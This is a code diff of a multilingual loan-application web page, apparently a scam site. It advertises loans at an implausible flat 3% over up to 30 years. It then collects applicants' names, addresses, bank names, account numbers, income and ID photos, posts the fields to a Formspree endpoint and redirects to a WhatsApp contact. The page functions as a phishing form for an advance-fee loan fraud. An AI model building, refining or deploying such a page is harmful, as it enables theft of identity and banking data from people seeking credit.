@@ -8,7 +8,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root { --primary: #1d4ed8; }
-        body { background-color: #F8FAFC; color: #1e293b; overflow-x: hidden; }
+        body { background-color: #F8FAFC; color: #1e293b; }
         .step { display: none; animation: fadeIn 0.4s ease-out; }
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -16,13 +16,13 @@
         .btn-elite { background: var(--primary); color: white; transition: all 0.3s; box-shadow: 0 10px 25px rgba(29, 78, 216, 0.3); }
         .lang-card { border: 2px solid transparent; background: white; cursor: pointer; }
         .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
-        #preview-container img { width: 100%; border-radius: 15px; border: 2px solid #1d4ed8; margin-top: 10px; }
+        #preview-img { width: 100%; border-radius: 15px; border: 2px solid #1d4ed8; margin-top: 10px; display: none; }
     </style>
 </head>
 <body class="font-sans">
 
     <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center p-6">
-        <h1 class="text-3xl font-black text-blue-900 mb-10 uppercase italic">GLOBAL EVOLUTION</h1>
+        <h1 class="text-3xl font-black text-blue-900 mb-10 uppercase italic text-center">GLOBAL EVOLUTION</h1>
         <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-10">
             <div onclick="selectLang('fr', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-fr">
                 <span class="text-3xl">🇫🇷</span><span class="font-bold text-[10px] uppercase">Français</span>
@@ -37,13 +37,13 @@
                 <span class="text-3xl">🇩🇪</span><span class="font-bold text-[10px] uppercase">Deutsch</span>
             </div>
         </div>
-        <button onclick="goToStep(2)" class="btn-elite w-full max-w-sm py-6 rounded-full font-black uppercase tracking-widest flex items-center justify-center gap-3">
+        <button onclick="goToStep(2)" class="btn-elite w-full max-w-sm py-6 rounded-full font-black uppercase flex items-center justify-center gap-3">
             <span id="btn-cont-text">CONTINUER</span> <i class="fas fa-chevron-right"></i>
         </button>
     </section>
 
     <section id="step-sim" class="step min-h-screen flex-col p-4">
-        <div class="max-w-xl mx-auto w-full pt-6 pb-20">
+        <div class="max-w-xl mx-auto w-full pt-6">
             <div class="glass-card p-8">
                 <h2 class="text-xl font-black text-blue-900 mb-8 text-center uppercase" id="sim-title">Simulateur</h2>
                 
@@ -61,27 +61,29 @@
 
                     <div>
                         <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
-                            <span id="lbl-dur">Durée de paiement</span>
-                            <span class="text-blue-700 text-lg"><span id="val-dur">2</span> <span id="lbl-years">Ans</span></span>
+                            <span id="lbl-dur">Durée</span>
+                            <div class="flex items-center gap-2">
+                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editYear()"></i>
+                                <span class="text-blue-700 text-lg"><span id="val-dur">2</span> <span id="lbl-years">Ans</span></span>
+                            </div>
                         </div>
                         <input type="range" id="yearRange" min="2" max="30" step="1" value="2" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                     </div>
                 </div>
 
-                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 p-4 opacity-10"><i class="fas fa-chart-line text-6xl"></i></div>
+                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl">
                     <div class="flex justify-between items-center mb-4">
                         <span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-300">Mensualité</span>
                         <span id="res-monthly" class="text-3xl font-black">--</span>
                     </div>
                     <div class="flex justify-between items-center border-t border-blue-800 pt-4">
-                        <span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-300">Total à payer (3% inclus)</span>
+                        <span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-300">Total (3% inclus)</span>
                         <span id="res-total" class="font-bold text-xl">--</span>
                     </div>
-                    <p class="text-[9px] mt-4 text-blue-200 italic font-medium" id="lbl-grace">(*) Le remboursement commence après 3 mois de grâce.</p>
+                    <p class="text-[9px] mt-4 text-blue-200 italic" id="lbl-grace">(*) Le remboursement commence après 3 mois.</p>
                 </div>
 
-                <button onclick="goToStep(3)" id="btn-next" class="btn-elite w-full py-6 rounded-full font-black mt-8 uppercase tracking-widest text-sm">Passer au dossier</button>
+                <button onclick="goToStep(3)" id="btn-next" class="btn-elite w-full py-6 rounded-full font-black mt-8 uppercase text-sm">Passer au dossier</button>
             </div>
         </div>
     </section>
@@ -89,42 +91,35 @@
     <section id="step-form" class="step min-h-screen flex-col p-4">
         <div class="max-w-xl mx-auto w-full pb-20">
             <div class="glass-card p-8">
-                <form action="https://formspree.io/f/mzdkpgay" method="POST" enctype="multipart/form-data" class="space-y-4">
+                <form action="https://formspree.io/f/mzdkpgay" method="POST" id="mainForm" onsubmit="handleFinalSubmit(event)">
                     <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier Digital</h2>
                     
-                    <input type="hidden" name="PRET_MONTANT" id="h-m">
-                    <input type="hidden" name="PRET_DUREE" id="h-d">
-                    <input type="hidden" name="DEVISE" id="h-c">
-
-                    <div class="grid grid-cols-2 gap-4">
-                        <input type="text" name="Prenom" id="i-pre" placeholder="Prénom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                        <input type="text" name="Nom" id="i-nom" placeholder="Nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                    <div class="grid grid-cols-2 gap-4 mb-4">
+                        <input type="text" name="Prenom" id="i-pre" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        <input type="text" name="Nom" id="i-nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                     </div>
-                    <input type="text" name="Adresse" id="i-adr" placeholder="Adresse complète" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                    <div class="grid grid-cols-2 gap-4">
-                        <input type="text" name="Pays" id="i-pais" placeholder="Pays" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                        <input type="text" name="Profession" id="i-pro" placeholder="Profession" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                    <input type="text" name="Adresse" id="i-adr" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
+                    <div class="grid grid-cols-2 gap-4 mb-4">
+                        <input type="text" name="Pays" id="i-pais" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        <input type="text" name="Profession" id="i-pro" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                     </div>
-                    <input type="tel" name="WhatsApp" id="i-wa" placeholder="WhatsApp" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                    <input type="email" name="Email" id="i-mail" placeholder="Email" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                    <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
+                    <input type="email" name="Email" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                     
-                    <div class="py-2 border-t border-slate-100 mt-4"><span class="text-[10px] font-bold text-slate-400 uppercase">Infos Bancaires</span></div>
-                    
-                    <input type="text" name="Nom_Banque" id="i-bank" placeholder="Nom de votre banque" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                    <input type="text" name="Adresse_Banque" id="i-adrb" placeholder="Adresse de la banque" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                    <input type="text" name="Numero_Compte" id="i-acc" placeholder="Numéro de compte (IBAN)" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                    <input type="text" name="Revenus" id="i-rev" placeholder="Revenus mensuels" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                    <input type="text" name="Banque" id="i-bank" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
+                    <input type="text" name="Compte" id="i-acc" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
+                    <input type="text" name="Revenus" id="i-rev" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-6">
 
-                    <div class="mt-6 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center">
-                        <label class="text-[10px] font-black text-blue-900 uppercase block mb-4" id="lbl-id">Pièce d'identité (Recto)</label>
-                        <input type="file" name="Carte_Identite" id="file-input" accept="image/*" class="hidden" onchange="previewImage(event)">
-                        <button type="button" onclick="document.getElementById('file-input').click()" class="px-6 py-3 bg-white border border-slate-200 rounded-xl text-xs font-bold text-slate-600 shadow-sm">
-                            <i class="fas fa-camera mr-2"></i> <span id="btn-photo">Choisir / Prendre photo</span>
+                    <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center">
+                        <label class="text-[10px] font-black text-blue-900 uppercase block mb-4" id="lbl-id">Pièce d'identité</label>
+                        <input type="file" id="file-input" accept="image/*" class="hidden" onchange="previewImage(event)">
+                        <button type="button" onclick="document.getElementById('file-input').click()" class="px-6 py-3 bg-white border border-slate-200 rounded-xl text-xs font-bold">
+                            <i class="fas fa-camera mr-2"></i> <span id="btn-photo-text">Choisir photo</span>
                         </button>
-                        <div id="preview-container"></div>
+                        <img id="preview-img" src="" alt="Aperçu">
                     </div>
 
-                    <button type="submit" id="btn-submit" class="btn-elite w-full py-6 rounded-full font-black uppercase text-sm mt-6 tracking-widest">Confirmer l'inscription</button>
+                    <button type="submit" id="btn-submit" class="btn-elite w-full py-6 rounded-full font-black uppercase text-sm mt-8">Confirmer l'inscription</button>
                 </form>
             </div>
         </div>
@@ -133,9 +128,9 @@
     <script>
         let cL = 'fr', cC = '€';
         const tr = {
-            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", grace: "(*) Le remboursement commence après 3 mois.", btnPhoto: "Prendre une photo", btnNext: "Passer au dossier", btnSubmit: "Confirmer l'inscription", plPre: "Prénom", plNom: "Nom", plAdr: "Adresse complète", plPays: "Pays", plPro: "Profession", plWa: "WhatsApp", plBank: "Banque", plAdrb: "Adresse Banque", plAcc: "N° Compte", plRev: "Revenus" },
-            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", grace: "(*) Payment starts after 3 months.", btnPhoto: "Take a photo", btnNext: "Next Step", btnSubmit: "Confirm Now", plPre: "First Name", plNom: "Last Name", plAdr: "Full Address", plPays: "Country", plPro: "Job", plWa: "WhatsApp", plBank: "Bank Name", plAdrb: "Bank Address", plAcc: "Account No", plRev: "Monthly Income" },
-            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", grace: "(*) El pago comienza después de 3 meses.", btnPhoto: "Tomar foto", btnNext: "PASAR AL EXPEDIENTE", btnSubmit: "CONFIRMAR INSCRIPCIÓN", plPre: "Nombre", plNom: "Apellido", plAdr: "Dirección", plPays: "País", plPro: "Profesión", plWa: "WhatsApp", plBank: "Nombre del banco", plAdrb: "Dirección del banco", plAcc: "Número de cuenta", plRev: "Ingresos" }
+            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", grace: "(*) Le remboursement commence après 3 mois.", btnPhoto: "Prendre / Choisir photo", btnNext: "Passer au dossier", btnSubmit: "Confirmer l'inscription", plPre: "Prénom", plNom: "Nom", plAdr: "Adresse", plPays: "Pays", plPro: "Profession", plWa: "WhatsApp", plBank: "Banque", plAcc: "N° Compte", plRev: "Revenus" },
+            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", grace: "(*) Payment starts after 3 months.", btnPhoto: "Take / Choose photo", btnNext: "Next Step", btnSubmit: "Confirm Now", plPre: "First Name", plNom: "Last Name", plAdr: "Address", plPays: "Country", plPro: "Job", plWa: "WhatsApp", plBank: "Bank Name", plAcc: "Account No", plRev: "Income" },
+            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", grace: "(*) El pago comienza después de 3 meses.", btnPhoto: "Tomar / Elegir foto", btnNext: "PASAR AL EXPEDIENTE", btnSubmit: "CONFIRMAR INSCRIPCIÓN", plPre: "Nombre", plNom: "Apellido", plAdr: "Dirección", plPays: "País", plPro: "Profesión", plWa: "WhatsApp", plBank: "Nombre del banco", plAcc: "N° de cuenta", plRev: "Ingresos" }
         };
 
         function selectLang(l, c) {
@@ -145,47 +140,46 @@
             updateUI();
         }
 
-        function goToStep(s) {
-            document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
-            document.getElementById(['','step-lang','step-sim','step-form'][s]).classList.add('active');
-            window.scrollTo(0,0);
-        }
-
         function editAmount() {
             let n = prompt("Montant :", document.getElementById('amountRange').value);
             if(n && !isNaN(n)) { document.getElementById('amountRange').value = n; updateSim(); }
         }
 
-        // LE CALCUL EXACT 3% SELON TON TEXTE (30 pour 1000)
+        function editYear() {
+            let n = prompt("Années (2-30) :", document.getElementById('yearRange').value);
+            if(n && !isNaN(n) && n >= 2 && n <= 30) { document.getElementById('yearRange').value = n; updateSim(); }
+        }
+
         function updateSim() {
             const a = parseFloat(document.getElementById('amountRange').value);
             const y = parseInt(document.getElementById('yearRange').value);
             document.getElementById('val-amt').innerText = a.toLocaleString();
             document.getElementById('val-dur').innerText = y;
-
-            const total = Math.round(a * 1.03); // Ajout direct des 3% d'intérêt
+            const total = Math.round(a * 1.03); 
             const monthly = Math.round(total / (y * 12));
-
             document.getElementById('res-monthly').innerText = monthly.toLocaleString() + " " + cC;
             document.getElementById('res-total').innerText = total.toLocaleString() + " " + cC;
-            
-            document.getElementById('h-m').value = a;
-            document.getElementById('h-d').value = y;
-            document.getElementById('h-c').value = cC;
             document.querySelectorAll('.curr').forEach(e => e.innerText = cC);
         }
 
-        // L'APERÇU DE LA PHOTO
         function previewImage(event) {
-            const container = document.getElementById('preview-container');
-            container.innerHTML = '';
             const reader = new FileReader();
             reader.onload = function() {
-                const img = document.createElement('img');
+                const img = document.getElementById('preview-img');
                 img.src = reader.result;
-                container.appendChild(img);
+                img.style.display = 'block';
             }
             reader.readAsDataURL(event.target.files[0]);
+        }
+
+        function handleFinalSubmit(event) {
+            const name = document.getElementById('i-nom').value;
+            const amt = document.getElementById('val-amt').innerText;
+            const msg = `Bonjour Global Aide, je suis ${name}. Voici ma pièce d'identité pour mon prêt de ${amt} ${cC}.`;
+            // On laisse Formspree envoyer les données texte, puis redirection
+            setTimeout(() => {
+                window.location.href = `https://wa.me/0199915433?text=${encodeURIComponent(msg)}`;
+            }, 1500);
         }
 
         function updateUI() {
@@ -201,7 +195,7 @@
             document.getElementById('form-title').innerText = t.fTitle;
             document.getElementById('btn-next').innerText = t.btnNext;
             document.getElementById('btn-submit').innerText = t.btnSubmit;
-            document.getElementById('btn-photo').innerText = t.btnPhoto;
+            document.getElementById('btn-photo-text').innerText = t.btnPhoto;
             
             document.getElementById('i-pre').placeholder = t.plPre;
             document.getElementById('i-nom').placeholder = t.plNom;
@@ -210,13 +204,19 @@
             document.getElementById('i-pro').placeholder = t.plPro;
             document.getElementById('i-wa').placeholder = t.plWa;
             document.getElementById('i-bank').placeholder = t.plBank;
-            document.getElementById('i-adrb').placeholder = t.plAdrb;
             document.getElementById('i-acc').placeholder = t.plAcc;
             document.getElementById('i-rev').placeholder = t.plRev;
             updateSim();
         }
 
+        function goToStep(s) {
+            document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
+            document.getElementById(['','step-lang','step-sim','step-form'][s]).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
         window.onload = () => { selectLang('fr', '€'); };
     </script>
 </body>
-</html>
+    </html>
+                            
